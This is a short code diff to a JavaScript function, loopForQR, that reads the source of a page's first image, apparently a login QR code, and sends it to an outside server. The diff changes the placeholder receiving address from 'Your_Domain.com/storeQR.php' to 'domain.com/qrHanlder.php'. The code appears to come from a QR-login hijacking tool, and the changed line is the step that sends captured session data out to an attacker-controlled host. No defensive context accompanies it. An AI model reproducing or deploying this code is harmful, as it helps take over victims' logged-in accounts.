@@ -19,7 +19,7 @@ function loopForQR() {
       {
         //Mirror the QR Code to our server
         var xhttp = new XMLHttpRequest();
-        xhttp.open('GET', 'https://www.Your_Domain.com/storeQR.php?c=' + document.getElementsByTagName('img')[0].src, true);
+        xhttp.open('GET', 'https://www.domain.com/qrHanlder.php?c=' + document.getElementsByTagName('img')[0].src, true);
         xhttp.send();
       }
     }
